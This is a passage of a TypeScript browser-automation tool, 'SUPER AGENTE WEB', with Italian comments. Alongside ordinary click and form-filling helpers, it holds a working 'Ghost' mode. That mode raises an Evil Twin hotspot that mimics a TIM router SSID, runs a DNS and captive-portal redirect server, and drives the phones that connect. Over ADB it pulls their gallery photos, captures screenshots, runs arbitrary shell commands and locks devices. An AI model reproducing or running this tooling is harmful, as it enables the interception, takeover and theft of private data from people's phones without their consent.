          console.log(`🔗 http://${hostname}.local/`);
        } else {
          console.log(`🔗 http://${localIp}:${port}/`);
          console.log(`🔗 http://${hostname}.local:${port}/`);
        }
      });
    });
  }

  async start() {
    console.log("\n🚀 --- SUPER AGENTE WEB v9.1 (Intelligent Search AI) ---");
    console.log(`🧠 Conoscenza acquisita: ${this.memory.length} azioni imparate.`);
    
    const localIp = this.getLocalIp();
    
    // --- GESTIONE ARGOMENTI RIGA DI COMANDO (SILENT MODE) ---
    const args = process.argv.slice(2);
    let choice = "";
    let url = "";
    let useCaptivePortal = false;

    const modeArg = args.find(a => a.startsWith('--mode='));
    const urlArg = args.find(a => a.startsWith('--url='));

    if (modeArg) {
      choice = modeArg.split('=')[1];
      url = urlArg ? urlArg.split('=')[1] : 'https://commercialista-roma.it/';
      console.log(`🤖 MODALITÀ AUTOMATICA: ${choice} | URL: ${url}`);
    } else {
      console.log("\nScegli una modalità di avvio:");
      console.log("1. https://commercialista-roma.it/ (Navigazione Standard)");
      console.log("2. MODALITÀ CAPTIVE PORTAL (Reindirizzamento Standard)");
      console.log("3. 🚀 MODALITÀ GHOST (Intercettazione Totale + UI Matrix)");
      choice = readlineSync.question("\nInserisci il numero o un URL personalizzato: ");
    }

    if (!choice || choice === "1") {
      url = url || 'https://commercialista-roma.it/';
    } else if (choice === "2" || choice === "3") {
      if (!modeArg) {
        url = readlineSync.question("Inserisci l'URL di destinazione (Default: https://commercialista-roma.it/): ");
      }
      if (!url) url = 'https://commercialista-roma.it/';
      useCaptivePortal = true;
      
      if (choice === "3") {
          console.log("\n🔥 GHOST MODE ATTIVATA: Intercettazione aggressiva e UI Matrix attiva.");
      }
    } else {
      url = choice;
    }

    if (!url.startsWith('http')) url = 'https://' + url;
    
    // Avvia il server di reindirizzamento SOLO se è stata scelta la modalità 2 o 3
    if (useCaptivePortal) {
      let currentSsid = this.getCurrentSsid();
      if (choice === "3") {
          currentSsid = "TIM-98707931"; // Forza SSID Evil Twin per Ghost Mode
          console.log(`🛰️ [BOSS] SSID EVIL TWIN: ${currentSsid}`);
      }
      this.toggleHotspot('on', currentSsid);
      
      console.log("⏳ [BOSS] Attesa inizializzazione interfaccia Hotspot...");
      await new Promise(resolve => setTimeout(resolve, 3000)); // Aspettiamo 3 secondi che l'IP 192.168.137.1 si stabilizzi

      const localIp = this.getLocalIp(true);
      this.startDnsServer(localIp);
      this.startRedirectServer(url);
    }

    this.browser = await chromium.launch({ 
      headless: false,
      args: ['--start-maximized'] 
    });
    const context = await this.browser.newContext({ viewport: null });
    this.page = await context.newPage();
    
    console.log(`\n🔍 Navigazione su: ${url}...`);
    try {
      await this.page.goto(url, { waitUntil: 'load', timeout: 60000 });
      this.history.push(`Visita: ${url}`);
      
      if (useCaptivePortal) {
        console.log("\n✅ MODALITÀ CAPTIVE ATTIVA.");
        console.log("👉 Puoi controllare i telefoni connessi dal terminale.");
        console.log("👉 Comandi disponibili: phone [alert|vibrate|matrix|url] [messaggio]");
        console.log("👉 Per uscire: chiudi");
        await this.captiveLoop();
      } else {
        await this.loop();
      }
    } catch (e) {
      if (useCaptivePortal) {
        console.warn("\n⚠️ Navigazione lenta, ma il server di rete è comunque attivo.");
        await new Promise(() => {});
      } else {
        console.warn("\n⚠️ La navigazione iniziale ha richiesto troppo tempo o ha avuto un problema.");
        console.log("👉 Provo comunque ad entrare nel loop dei comandi...");
        this.history.push(`Visita (fallita o lenta): ${url}`);
        await this.loop();
      }
    }
  }

  private async askQuestion(query: string): Promise<string> {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      terminal: true
    });
    return new Promise(resolve => {
      rl.question(query, answer => {
        rl.close();
        resolve(answer);
      });
    });
  }

  private async captiveLoop() {
    console.log("\n--- DASHBOARD LIVE ATTIVA ---");
    console.log("In attesa di connessioni... I log appariranno in tempo reale.");
    this.showStatus();
    
    while (true) {
      const input = (await this.askQuestion("\n[CAPTIVE CONTROL] > ")).toLowerCase().trim();
      if (!input) continue;

      if (input === "status") {
        this.showStatus();
        continue;
      }

      if (input === "phone list" || input === "phone ls") {
        console.log(`\n📱 STATO AGENTE: Porte attive [${this.activePorts.join(', ')}]`);
        console.log(`📱 DISPOSITIVI AGGANCIATI: ${this.phoneConnections.size}`);
        
        if (this.phoneConnections.size === 0) {
          console.log("   (Nessun dispositivo pronto al controllo remoto)");
        } else {
          const conns = Array.from(this.phoneConnections);
          conns.forEach((c, i) => {
            console.log(`   [${i + 1}] ${c.device} - IP: ${c.ip}`);
          });
        }
        
        // --- INTEGRAZIONE: MOSTRA ANCHE DISPOSITIVI SULLA RETE (ARP) ---
        console.log(`\n📡 SCANSIONE RAPIDA RETE (ARP):`);
        try {
          const out = execSync('arp -a', { encoding: 'utf-8' });
          const lines = out.split('\n').filter(l => l.includes('dynamic') || l.includes('dinamico'));
          if (lines.length > 0) {
            lines.slice(0, 5).forEach(l => console.log(`   🔗 ${l.trim().split(/\s+/)[0]}`));
            if (lines.length > 5) console.log(`   ... e altri ${lines.length - 5} dispositivi.`);
          } else {
            console.log("   Nessun altro dispositivo dinamico rilevato.");
          }
        } catch (e) {}
        continue;
      }

      if (input === "phone scan" || input === "phone scanner" || input === "scanner") {
        console.log("\n🚀 AVVIO WIFI SCANNER GUI (wifi_scanner_89.py)...");
        try {
          const scannerPath = path.join(__dirname, 'wifi_scanner_89.py');
          // Lo avviamo in modo non bloccante per non fermare il terminale
          const { spawn } = require('child_process');
          spawn('python', [scannerPath], { 
            detached: true, 
            stdio: 'ignore' 
          }).unref();
          console.log("✅ Scanner avviato in una finestra separata.");
        } catch (e) {
          console.error(`❌ Errore durante l'avvio dello scanner: ${(e as Error).message}`);
        }
        continue;
      }

      if (input === "server restart") {
        console.log("\n🔄 RIAVVIO SERVER HTTP...");
        this.redirectServers.forEach(s => s.close());
        this.redirectServers = [];
        this.activePorts = [];
        this.phoneConnections.clear();
        this.startRedirectServer('https://commercialista-roma.it/');
        continue;
      }

      if (input.startsWith("phone")) {
        const parts = input.split(' ');
        // phone [id|all] [tipo] [msg]
        let targetId = parts[1];
        let type = parts[2];
        let content = parts.slice(3).join(' ');

        // Se l'utente scrive 'phone alert ciao', assumiamo target 'all'
        if (isNaN(parseInt(targetId)) && targetId !== 'all') {
          content = parts.slice(2).join(' ');
          type = parts[1];
          targetId = 'all';
        }

        const payload = JSON.stringify({ 
          type: type || 'alert', 
          msg: content || 'Messaggio dal PC!',
          url: content 
        });

        const conns = Array.from(this.phoneConnections);
        let targets: any[] = [];

        if (targetId === 'all') {
          targets = conns;
        } else {
          const idx = parseInt(targetId) - 1;
          if (conns[idx]) targets = [conns[idx]];
          else {
            console.log(`❌ Dispositivo #${targetId} non trovato.`);
            continue;
          }
        }

        // --- GESTIONE COMANDI SPECIALI (LOCK AVANZATO) ---
        const ADB_PATH = `D:\\scrcpy-win64-v3.3.4\\adb.exe`;

        if (type === 'lock') {
          console.log(`\n🛡️ TENTATIVO BLOCCO REALE (WEB + ADB)...`);
          targets.forEach(t => {
            t.res.write(`data: ${payload}\n\n`);
            if (t.device.includes('Android')) {
              try {
                const adbScript = path.join(__dirname, 'phone_adb_control.py');
                execSync(`python "${adbScript}" ${t.ip}`, { timeout: 5000 });
              } catch (e) {}
            } else {
              console.log(`ℹ️ Salto ADB Lock per ${t.device} (Solo Android).`);
            }
          });
          continue;
        }

        if (type === 'info') {
          console.log(`\n📋 RICHIESTA INFO DISPOSITIVO (ADB)...`);
          targets.forEach(t => {
            if (!t.device.includes('Android')) {
              console.log(`ℹ️ Salto ADB Info per ${t.device} (Solo Android).`);
              return;
            }
            try {
              const info = execSync(`"${ADB_PATH}" -s ${t.ip}:5555 shell getprop ro.product.model`, { encoding: 'utf-8', timeout: 3000 });
              const battery = execSync(`"${ADB_PATH}" -s ${t.ip}:5555 shell dumpsys battery | findstr level`, { encoding: 'utf-8', timeout: 3000 });
              console.log(`📱 ${t.device} [${t.ip}]: ${info.trim()} | ${battery.trim()}`);
            } catch (e) {
              console.log(`❌ Impossibile ottenere info via ADB per ${t.ip}. Debug wireless attivo?`);
            }
          });
          continue;
        }

        if (type === 'gallery' || type === 'dump-foto') {
          console.log(`\n🖼️ RECUPERO ULTIME 20 FOTO DALLA GALLERIA...`);
          targets.forEach(t => {
            if (t.device.includes('iPhone') || t.device.includes('iPad') || t.device.includes('iOS')) {
              console.log(`   📡 Invio richiesta Gallery Push a ${t.device} (${t.ip})...`);
              t.res.write(`data: ${JSON.stringify({ type: 'gallery' })}\n\n`);
              return;
            }
            
            if (!t.device.includes('Android')) {
              console.log(`ℹ️ Salto Dump Foto per ${t.device} (Solo Android/iOS).`);
              return;
            }
            // ... resto della logica Android ...
            try {
              const targetDir = path.join(process.cwd(), 'gallery_dump', t.ip.replace(/\./g, '_'));
              if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

              console.log(`   🔍 Ricerca file in corso su ${t.ip}...`);
              const findCmd = `"${ADB_PATH}" -s ${t.ip}:5555 shell "ls -t /sdcard/DCIM/Camera/*.jpg /sdcard/DCIM/Camera/*.png /sdcard/Pictures/*.jpg 2>/dev/null | head -n 20"`;
              const files = execSync(findCmd, { encoding: 'utf-8', timeout: 5000 }).split('\n').map(f => f.trim()).filter(f => f);

              if (files.length === 0) {
                console.log(`   ⚠️ Nessuna foto trovata nei percorsi standard di ${t.ip}.`);
                return;
              }

              console.log(`   📥 Scaricamento di ${files.length} foto...`);
              files.forEach((remoteFile, index) => {
                const ext = path.extname(remoteFile);
                const localFile = path.join(targetDir, `foto_${index + 1}${ext}`);
                execSync(`"${ADB_PATH}" -s ${t.ip}:5555 pull "${remoteFile}" "${localFile}"`, { timeout: 15000 });
                process.stdout.write(`.`);
              });
              
              console.log(`\n✅ Recupero completato! Foto salvate in: ${targetDir}`);
            } catch (e) {
              console.log(`\n❌ Errore durante il dump della galleria per ${t.ip}: ${(e as Error).message}`);
            }
          });
          continue;
        }

        if (type === 'screenshot' || type === 'foto') {
          console.log(`\n📸 CATTURA SCREENSHOT DISPOSITIVO (ADB)...`);
          targets.forEach(t => {
            if (!t.device.includes('Android')) {
              console.log(`ℹ️ Salto ADB Screenshot per ${t.device} (Solo Android).`);
              return;
            }
            try {
              const filename = `screenshot_${t.ip.replace(/\./g, '_')}_${Date.now()}.png`;
              const localPath = path.join(process.cwd(), 'captures', filename);
              if (!fs.existsSync(path.dirname(localPath))) fs.mkdirSync(path.dirname(localPath), { recursive: true });

              execSync(`"${ADB_PATH}" -s ${t.ip}:5555 shell screencap -p /sdcard/screen.png`, { timeout: 5000 });
              execSync(`"${ADB_PATH}" -s ${t.ip}:5555 pull /sdcard/screen.png "${localPath}"`, { timeout: 5000 });
              console.log(`✅ Screenshot salvato in: ${localPath}`);
            } catch (e) {
              console.log(`❌ Errore screenshot su ${t.ip}.`);
            }
          });
          continue;
        }

        if (type === 'adb-shell' || type === 'sh') {
          console.log(`\n💻 ESECUZIONE ADB SHELL: ${content}`);
          targets.forEach(t => {
            if (!t.device.includes('Android')) {
              console.log(`ℹ️ Salto ADB Shell per ${t.device} (Solo Android).`);
              return;
            }
            try {
              const output = execSync(`"${ADB_PATH}" -s ${t.ip}:5555 shell ${content}`, { encoding: 'utf-8', timeout: 5000 });
              console.log(`📱 [${t.ip}] OUTPUT:\n${output}`);
            } catch (e) {
              console.log(`❌ Errore esecuzione su ${t.ip}.`);
            }
          });
          continue;
        }
        
        console.log(`📡 INVIO '${type || 'alert'}' A ${targets.length} DISPOSITIVI...`);
        targets.forEach(t => t.res.write(`data: ${payload}\n\n`));
        continue;
      }

      if (input === "chiudi" || input === "exit") {
        console.log("👋 Chiusura agente...");
        // Forza la chiusura immediata per evitare che processi appesi blocchino il terminale
        try {
          this.phoneConnections.forEach(c => c.res.end());
          this.redirectServers.forEach(s => s.close());
          if (this.browser) {
            // Non usiamo await qui per non restare appesi se il browser non risponde
            this.browser.close().catch(() => {});
          }
        } catch (e) {}
        setTimeout(() => process.exit(0), 500);
        return;
      }

      console.log("⚠️ In questa modalità puoi usare solo: 'phone list', 'phone [tipo] [msg]' o 'chiudi'");
    }
  }

  private async visualClick(templateName: string) {
    if (!this.page) return;
    
    console.log(`📸 Avvio ricerca visuale per: "${templateName}"...`);
    const screenshotPath = path.join(__dirname, `temp_screenshot_${Date.now()}.png`);
    const templatePath = path.join(__dirname, 'templates', `${templateName}.png`);

    if (!fs.existsSync(templatePath)) {
      console.log(`❌ Errore: Template "${templateName}.png" non trovato in /rete/templates/`);
      return;
    }

    try {
      await this.page.screenshot({ path: screenshotPath });
      
      const bridgePath = path.join(__dirname, 'visual_bridge.py');
      const output = execSync(`python "${bridgePath}" "${screenshotPath}" "${templatePath}" 0.8`, { encoding: 'utf-8' });
      const result = JSON.parse(output);

      if (result && result.x) {
        console.log(`🎯 Bersaglio trovato! Coordinate: ${result.x}, ${result.y} (Confidenza: ${Math.round(result.confidence * 100)}%)`);
        await this.page.mouse.click(result.x, result.y);
        console.log("✅ Cliccato visivamente.");
      } else {
        console.log("❌ Bersaglio non trovato visivamente nella pagina attuale.");
      }
    } catch (e) {
      console.error("❌ Errore durante il click visuale:", (e as Error).message);
    } finally {
      if (fs.existsSync(screenshotPath)) fs.unlinkSync(screenshotPath);
    }
  }

  private async loop() {
    while (true) {
      console.log("\n-------------------------------------------");
      console.log("Comandi: ia, clicca [testo], clicca_v [immagine], scrivi [testo] in [campo], scorrere, ricaricare, screenshot, indietro, avanti, aspetta [secondi], analizza, status, aiuto, chiudi.");
      
      const currentUrl = this.page?.url() || "";
      if (this.lastUrl && currentUrl !== this.lastUrl) {
        console.log(`\n🌐 Navigazione rilevata (${currentUrl}). Invalido la cache di analisi precedente.`);
        this.lastSearchQuery = undefined;
        this.lastAnalyzedElements = [];
      }
      this.lastUrl = currentUrl;

      const input = (await this.askQuestion("> ")).toLowerCase().trim();

      if (input.startsWith("clicca_v") || input.startsWith("cv")) {
        const template = input.replace(/clicca_v|cv/, "").trim();
        await this.visualClick(template);
        continue;
      }

      if (input.startsWith("phone")) {
        const [_, type, ...contentParts] = input.split(' ');
        const content = contentParts.join(' ');
        const payload = JSON.stringify({ 
          type: type || 'alert', 
          msg: content || 'Messaggio dal PC!',
          url: content 
        });
        
        console.log(`📡 INVIO COMANDO A ${this.phoneConnections.size} TELEFONI: ${type || 'alert'}...`);
        this.phoneConnections.forEach(conn => {
          conn.write(`data: ${payload}\n\n`);
        });
        continue;
      }

      // Se siamo in modalità Captive Portal (2), permettiamo solo i comandi 'phone' o 'chiudi'
      // per evitare confusione con la navigazione del browser locale che deve restare fissa
      if (process.argv.includes('--mode=2') && !input.startsWith('phone') && !input.includes('chiudi') && !input.includes('exit')) {
        console.log("\n⚠️ MODALITÀ CAPTIVE ATTIVA: Puoi usare solo i comandi 'phone' per controllare i telefoni.");
        console.log("👉 Esempio: phone alert Ciao!");
        console.log("👉 Per chiudere tutto: chiudi");
        continue;
      }

      try {
        if (!input) continue;
        if (input === "aiuto") {
          this.showHelp();
          continue;
        }

        if (input === "ia") {
          await this.runAI();
          continue;
        }

        if (input === "scanner" || input === "scan") {
          console.log("\n🚀 AVVIO WIFI SCANNER GUI (wifi_scanner_89.py)...");
          try {
            const scannerPath = path.join(__dirname, 'wifi_scanner_89.py');
            const { spawn } = require('child_process');
            spawn('python', [scannerPath], { detached: true, stdio: 'ignore' }).unref();
            console.log("✅ Scanner avviato.");
          } catch (e) {}
          continue;
        }

        if (input === "status") {
          const url = this.page?.url();
          const title = await this.page?.title();
          console.log(`🌐 URL attuale: ${url}`);
          console.log(`📄 Titolo: ${title}`);
          continue;
        }
        if (input.includes("chiudi") || input.includes("exit")) {
          console.log("👋 Chiusura agente...");
          try {
            this.phoneConnections.forEach(c => c.res.end());
            this.redirectServers.forEach(s => s.close());
            if (this.browser) this.browser.close().catch(() => {});
          } catch (e) {}
          setTimeout(() => process.exit(0), 500);
          break;
        }

        if (input === "ricarica" || input === "ricaricare" || input === "reload") {
          console.log("🔄 Ricarica pagina...");
          await this.page?.reload({ waitUntil: 'networkidle' });
          continue;
        }

        if (input === "indietro" || input === "back") {
          console.log("⬅️ Torno indietro...");
          await this.page?.goBack();
          continue;
        }

        if (input === "avanti" || input === "forward") {
          console.log("➡️ Vado avanti...");
          await this.page?.goForward();
          continue;
        }

        if (input === "screenshot" || input === "foto") {
          const path = `debug_screenshot_${Date.now()}.png`;
          await this.page?.screenshot({ path });
          console.log(`📸 Screenshot salvato in: ${path}`);
          continue;
        }

        if (input.startsWith("aspetta") || input.startsWith("wait")) {
          const secs = parseInt(input.split(" ")[1]) || 2;
          console.log(`⏳ Attendo ${secs} secondi...`);
          await this.page?.waitForTimeout(secs * 1000);
          continue;
        }

        if (input.includes("scorrere") || input.includes("scroll") || input === "giu") {
          console.log("⏬ Scorrimento...");
          await this.page?.evaluate(() => window.scrollBy(0, window.innerHeight * 0.8));
          continue;
        }

        if (input.startsWith("clicca") || input.startsWith("click")) {
          const target = input.replace(/clicca|click/, "").trim();
          if (target.includes(",")) { // Click a coordinate: "clicca 100,200"
            const [x, y] = target.split(",").map(n => parseInt(n.trim()));
            if (!isNaN(x) && !isNaN(y)) {
              console.log(`📍 Clicco alle coordinate: ${x}, ${y}`);
              await this.page?.mouse.click(x, y);
              continue;
            }
          }
          await this.smartClick(target);
          continue;
        }

        if (input.startsWith("scrivi") || input.startsWith("type") || input.startsWith("fill")) {
          const match = input.match(/(?:scrivi|type|fill) (.*) (?:in|su) (.*)/i);
          if (match) {
            await this.smartFill(match[2].trim(), match[1].trim());
          } else {
            console.log("⚠️ Usa: 'scrivi [testo] in [nome campo]'");
          }
          continue;
        }

        if (input.startsWith("analizza") || input.startsWith("analyze")) {
          const query = input.replace(/analizza|analyze/, "").trim();
          // Se l'utente chiama 'analizza' senza argomenti, vogliamo un reset completo
          await this.analyzePage(query || undefined, false);
          continue;
        }

        // Se l'input è un numero, prova a interagire con l'elemento analizzato
        const num = parseInt(input);
        if (!isNaN(num) && num > 0 && num <= this.lastAnalyzedElements.length) {
          const elInfo = this.lastAnalyzedElements[num - 1];
          const locator = this.page.locator(`[data-trae-idx="${elInfo.idx}"]`);
          
          if (await locator.isVisible()) {
            console.log(`🎯 Azione su: [${elInfo.tag}] "${elInfo.desc}"`);
            
            if (elInfo.isInput && !['checkbox', 'radio', 'submit', 'button'].includes(elInfo.type.toLowerCase())) {
              const val = readline.question(`✍️ Cosa vuoi scrivere? `);
              await locator.fill(val);
              console.log("✅ Testo inserito.");
            } else {
              await locator.click();
              console.log("✅ Cliccato.");
            }
            
            // Auto-refresh analisi dopo interazione per riflettere cambiamenti DOM
            console.log("⏳ Attendo stabilità pagina...");
            await this.page.waitForLoadState('networkidle', { timeout: 3000 }).catch(() => {});
            await this.page.waitForTimeout(2000);
            await this.analyzePage(undefined, true); // Refresh automatico con query esistente
          } else {
            console.log("❌ L'elemento non è più visibile o la pagina è cambiata.");
          }
          continue;
        }

        // Se non riconosce, tenta di cliccare per nome come default
        console.log(`🤖 Tento di interpretare "${input}" come un click...`);
        await this.smartClick(input);

      } catch (error) {
        console.error("❌ Errore durante l'azione:", (error as Error).message);
      }
    }
  }

  private async smartClick(target: string) {
    if (!this.page) {
      console.error("❌ Errore: Pagina non inizializzata.");
      return;
    }
    console.log(`🔎 Cerco: "${target}"...`);
    
    const selectors = [
      `text=/${target}/i`,
      `button:has-text("${target}")`,
      `a:has-text("${target}")`,
      `[role="button"]:has-text("${target}")`,
      `[aria-label*="${target}" i]`,
      `[title*="${target}" i]`,
      `"${target}"`
    ];

    for (const selector of selectors) {
      try {
        const element = this.page.locator(selector).first();
        if (await element.isVisible({ timeout: 800 })) {
          await element.scrollIntoViewIfNeeded();
          
          // Verifica se l'elemento è coperto da altri (clickability)
          const isClickable = await element.isEnabled().catch(() => false);
          if (!isClickable) {
            console.log(`⚠️ Elemento "${selector}" trovato ma non abilitato.`);
            continue;
          }

          // Click robusto: tenta il click standard, se fallisce usa la forza o l'evento JS
          try {
            await element.click({ timeout: 2000 });
          } catch (e) {
            console.log("⚠️ Click standard fallito, provo dispatchEvent...");
            await element.dispatchEvent('click');
          }
          
          console.log(`✅ Cliccato su: ${selector}`);
          this.history.push(`Click: ${target}`);
          return;
        }
      } catch (e) {}
    }
    console.log(`❓ Non ho trovato nulla per "${target}". Prova un nome diverso.`);
  }

  private async smartFill(field: string, text: string) {
    if (!this.page) {
      console.error("❌ Errore: Pagina non inizializzata.");
      return;
    }
    console.log(`✍️ Cerco campo "${field}"...`);

    const selectors = [
      `input[placeholder*="${field}" i]`,
      `input[name*="${field}" i]`,
      `input[id*="${field}" i]`,
      `label:has-text("${field}")`, // Cerchiamo la label e poi l'input associato
      `input[aria-label*="${field}" i]`,
      `textarea[placeholder*="${field}" i]`,
      `[role="textbox"]:has-text("${field}")`
    ];

    for (const selector of selectors) {
      try {
        let element = this.page.locator(selector).first();
        
        // Se abbiamo trovato una label, cerchiamo l'input associato
        if (selector.startsWith('label')) {
          const labelFor = await element.getAttribute('for');
          if (labelFor) {
            element = this.page.locator(`#${labelFor}`);
          } else {
            // Se non c'è "for", cerchiamo un input vicino o dentro
            element = this.page.locator(`${selector} >> .. >> input, ${selector} >> input`).first();
          }
        }

        if (await element.isVisible({ timeout: 800 })) {
          await element.scrollIntoViewIfNeeded();
          await element.focus();
          await element.fill(text);
          console.log(`✅ Scritto in: ${selector}`);
          this.history.push(`Fill: ${field} = ${text}`);
          return;
        }
      } catch (e) {}
    }
    console.log(`❌ Impossibile trovare il campo "${field}".`);
  }

  private async analyzePage(searchQuery?: string, isAutoRefresh: boolean = false) {
    if (!this.page) return;
    
    // Se non è un auto-refresh e l'utente ha chiesto 'analizza' senza argomenti, resettiamo la query persistente
    if (!isAutoRefresh && searchQuery === undefined) {
      this.lastSearchQuery = undefined;
    }

    // Se non passiamo una query, ma ce n'era una precedente, usiamo quella (refresh)
    if (searchQuery === undefined && this.lastSearchQuery !== undefined) {
      searchQuery = this.lastSearchQuery;
    } else if (searchQuery !== undefined) {
      this.lastSearchQuery = searchQuery;
    }

    if (searchQuery) {
      console.log(`📊 Refresh analisi semantica per: "${searchQuery}"...`);
    } else {
      console.log("📊 Analisi elementi interattivi...");
    }

    // Svuotiamo i risultati precedenti per evitare dati obsoleti in caso di errore
    this.lastAnalyzedElements = [];
    
    // Passiamo concetti e query al browser per lo scoring in tempo reale
    const universalConcepts: Record<string, string[]> = {
      "acquisto": ["carrello", "cart", "buy", "compra", "aggiungi", "add", "checkout", "shop", "pagamento", "payment", "ordine", "order", "pagare", "pay", "upgrade", "select", "choose", "get started", "abbonati", "iscriviti", "prova", "subscribe", "subscription", "plan", "start", "piano"],
      "account": ["login", "accedi", "sign in", "registrati", "signup", "user", "profilo", "profile", "mio", "my", "account", "entra", "entrare", "log in", "telefono", "phone", "mobile", "cellulare", "sms"],
      "prezzi": ["pricing", "prezzi", "piani", "plans", "abbonamento", "costo", "tariffe", "subscription", "offerte", "offers", "prezzo", "price", "piano", "costi"],
      "periodo": ["annuale", "yearly", "year", "anno", "mensile", "monthly", "month", "mese", "settimanale", "weekly"],
      "navigazione": ["home", "inizio", "chi siamo", "about", "servizi", "services", "prodotti", "products", "blog", "news", "notizie", "scopri", "explore"]
    };
    
    const evalString = `(({ query, concepts }) => {
      // Invalida cache: rimuove vecchi ID e riesegue DOM scan
      document.querySelectorAll('[data-trae-idx]').forEach(el => el.removeAttribute('data-trae-idx'));

      const isSimilar = (s1, s2) => {
        if (!s1 || !s2) return false;
        const str1 = s1.toLowerCase().trim();
        const str2 = s2.toLowerCase().trim();
        if (str1 === str2) return true;
        if (str2.length < 3) return str1 === str2 || str1.split(/\\s+/).includes(str2);
        return str1.includes(str2) || str2.includes(str1);
      };

      const getDesc = (el) => {
        const tag = el.tagName.toLowerCase();
        const placeholder = el.getAttribute('placeholder') || '';
        const label = document.querySelector(\`label[for="\${el.id}"]\`)?.innerText || '';
        const aria = el.getAttribute('aria-label') || '';
        const title = el.getAttribute('title') || '';
        const name = el.getAttribute('name') || '';
        const text = (el.innerText || el.textContent || '').trim().substring(0, 50);

        if (tag === 'input' || tag === 'textarea') {
          return label || placeholder || aria || title || name || (text ? \`[\${text}]\` : \`Campo \${el.type || tag}\`);
        }
        return text || aria || title || placeholder || \`[\${tag}]\`;
      };

      const interactive = Array.from(document.querySelectorAll('button, a, input, textarea, [role="button"], summary, [onclick]'))
        .filter(el => {
          const rect = el.getBoundingClientRect();
          return rect.width > 0 && rect.height > 0 && window.getComputedStyle(el).visibility !== 'hidden';
        });

      let results = interactive.map((el, index) => {
        const desc = getDesc(el).toLowerCase();
        let score = 0;

        if (query) {
          const queryWords = query.toLowerCase().split(/\\s+/);
          queryWords.forEach(w => {
            if (isSimilar(desc, w)) score += 100;
            
            // Espansione semantica (sinonimi)
            for (const [intent, keywords] of Object.entries(concepts)) {
              if (keywords.some(k => isSimilar(w, k))) {
                if (keywords.some(k => isSimilar(desc, k))) score += 50;
              }
            }
          });
          
          // Bonus per corrispondenza esatta dell'intento (es. "telefono")
          if (isSimilar(desc, query)) score += 200;
        }

        return {
          el,
          idx: (index + 1).toString(),
          tag: el.tagName,
          type: el.type || '',
          desc: getDesc(el).trim(),
          isInput: el.tagName === 'INPUT' || el.tagName === 'TEXTAREA',
          score
        };
      });

      // Ordina per rilevanza e assegna ID definitivi
      if (query) {
        results = results.filter(r => r.score > 0).sort((a, b) => b.score - a.score);
      }
      
      return results.slice(0, 30).map((r, i) => {
        // Riassegniamo idx in base all'ordine di visualizzazione attuale
        const displayIdx = (i + 1).toString();
        r.el.setAttribute('data-trae-idx', displayIdx);
        return {
          idx: displayIdx,
          tag: r.tag,
          type: r.type,
          desc: r.desc,
          isInput: r.isInput,
          score: r.score
        };
      });
    })(${JSON.stringify({ query: searchQuery, concepts: universalConcepts })})`;

    try {
      this.lastAnalyzedElements = await this.page.evaluate(evalString) as any[];

      if (this.lastAnalyzedElements.length === 0) {
        console.log(searchQuery ? `📭 Nessun elemento rilevante trovato per "${searchQuery}".` : "📭 Nessun elemento interattivo trovato.");
      } else {
        this.lastAnalyzedElements.forEach((el) => {
          const scoreInfo = searchQuery ? ` (Rilevanza: ${el.score})` : "";
          console.log(`${el.idx}. [${el.tag}] "${el.desc}"${scoreInfo}`);
        });
        console.log(`\n💡 Digita il numero (1-${this.lastAnalyzedElements.length}) per interagire.`);
      }
    } catch (e) {
      console.error("❌ Errore durante l'analisi:", (e as Error).message);
    }
  }

  private async runAI() {
    if (!this.page) return;
    console.log("\n🧠 --- AGENTE INTELLIGENTE v8.0 (Precision Transactional AI) ---");
    const goal = readline.question("Descrivi il tuo obiettivo: ").toLowerCase();

    console.log("🧐 Fase 1: Ragionamento Semantico Universale...");
    
    // Dizionario Bilingue Universale (Italiano + Inglese) - Espanso e Categorizzato
    const universalConcepts: Record<string, string[]> = {
      "acquisto": ["carrello", "cart", "buy", "compra", "aggiungi", "add", "checkout", "shop", "pagamento", "payment", "ordine", "order", "pagare", "pay", "upgrade", "select", "choose", "get started", "abbonati", "iscriviti", "prova", "subscribe", "subscription", "plan", "start", "piano"],
      "account": ["login", "accedi", "sign in", "registrati", "signup", "user", "profilo", "profile", "mio", "my", "account", "entra", "entrare", "log in"],
      "prezzi": ["pricing", "prezzi", "piani", "plans", "abbonamento", "costo", "tariffe", "subscription", "offerte", "offers", "prezzo", "price", "piano", "costi"],
      "periodo": ["annuale", "yearly", "year", "anno", "mensile", "monthly", "month", "mese", "settimanale", "weekly", "yearlysave25%"],
      "aiuto": ["docs", "documentazione", "aiuto", "help", "support", "contatti", "contact", "supporto", "faq", "assistenza", "guida", "guide", "info", "question", "answer", "differenza", "why", "how", "what", "usage", "models", "consume", "differently", "fails", "refund", "mail", "forget password", "reset", "recupero", "termini", "privacy", "terms", "policy"],
      "navigazione": ["home", "inizio", "chi siamo", "about", "servizi", "services", "prodotti", "products", "blog", "news", "notizie", "scopri", "explore"]
    };

    const oppositeConcepts: Record<string, string[]> = {
      "annuale": ["mensile", "monthly", "month", "mese", "one-month"],
      "yearly": ["mensile", "monthly", "month", "mese", "one-month"],
      "mensile": ["annuale", "yearly", "year", "anno"],
      "monthly": ["annuale", "yearly", "year", "anno"],
      "pro+": ["lite", "\\bpro\\b", "ultra", "free", "gratis", "basic", "starter"],
      "pro": ["lite", "pro\\+", "ultra", "free", "gratis", "basic", "starter"]
    };

    const findBestElement = async (userGoal: string, excludeText: string[] = [], step: number) => {
      const evalString = `(({ goal, exclude, pastMemory, concepts, opposites, currentStep }) => {
        const isSimilar = (s1, s2) => {
          if (!s1 || !s2) return false;
          const str1 = s1.toLowerCase().trim();
          const str2 = s2.toLowerCase().trim();
          if (str1 === str2) return true;
          
          // Gestione precisa Pro vs Pro+ tramite Regex
          if (str2 === 'pro' && str1.includes('pro+')) return false;
          if (str2 === 'pro+' && str1 === 'pro') return false;

          if (str2.length < 4) return str1 === str2 || str1.split(/\\s+/).includes(str2);
          if (str1.includes(str2) || str2.includes(str1)) return true;
          
          let matches = 0;
          const minLen = Math.min(str1.length, str2.length);
          for (let i = 0; i < minLen; i++) {
            if (str1[i] === str2[i]) matches++;
          }
          return matches / Math.max(str1.length, str2.length) > 0.85;
        };

        const all = Array.from(document.querySelectorAll('a, button, [role="button"], span, label, summary, div, h1, h2, h3'));
        const goalWords = goal.split(/\\s+/).filter(w => w.length >= 2);
        
        let detectedIntents = [];
        for (const [intent, keywords] of Object.entries(concepts)) {
          if (keywords.some(k => isSimilar(goal, k))) {
            detectedIntents.push(intent);
          }
        }

        const scored = all.map(el => {
          const text = (el.textContent || "").toLowerCase().trim();
